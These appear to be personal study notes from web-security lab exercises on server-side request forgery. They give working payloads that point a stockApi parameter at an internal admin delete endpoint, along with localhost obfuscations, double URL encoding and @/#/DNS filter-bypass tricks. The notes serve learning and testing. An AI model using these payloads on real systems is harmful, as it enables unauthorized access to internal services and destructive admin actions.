Server-side request forgery

You can modify the internal request made to the internal network, usually used for retriving data from DB, utilizing API.
In other words you can access directly to admin panel withouth any restriction
stockApi=%68%74%74%70%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%2f%61%64%6d%69%6e%2f%64%65%6c%65%74%65%3f%75%73%65%72%6e%61%6d%65%3d%63%61%72%6c%6f%73

stockApi=http://localhost/admin/delete?username=carlos

----------------------------------------------------

Sometime you need to iterate with burp intruder to find out the correct IP internal address

----------------------------------------------------

In other scenarios, you need to obfuscate localhost or 127.0.0.1 or 127.1 with 2130706433 or 017700000001

Try to use double encode such as 
a->%61->%2561
%25 = %

----------------------------------------------------
Common three methods to follow when you face an url doimain restriction


stockApi=http%3A%2F%2Flocalhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos

You can embed credentials in a URL before the hostname, using the @ character. For example:

https://expected-host@evil-host
You can use the # character to indicate a URL fragment. For example:

https://evil-host#expected-host
You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:

https://expected-host.evil-host
You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
You can use combinations of these techniques together.


In this case this was the url to use and compose, hence a mix of the methods described above

URI crafted:
http%3A%2F%2Flocalhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
Normal URI:
http://localhost:80#@stock.weliketoshop.net/admin/delete?username=carlos

# -> it's used as a fragment to allow you to use the full url, maching howere the control made by the firewall


In other scenario you need to find a redirection and place this request in the stockAPI, which is allow to contact internal machine

Tricky mix of a lot of SSRF bypasses

http%3A%2F%2F127.1:80%2523@stock.weliketoshop.net%2F%2561dmin
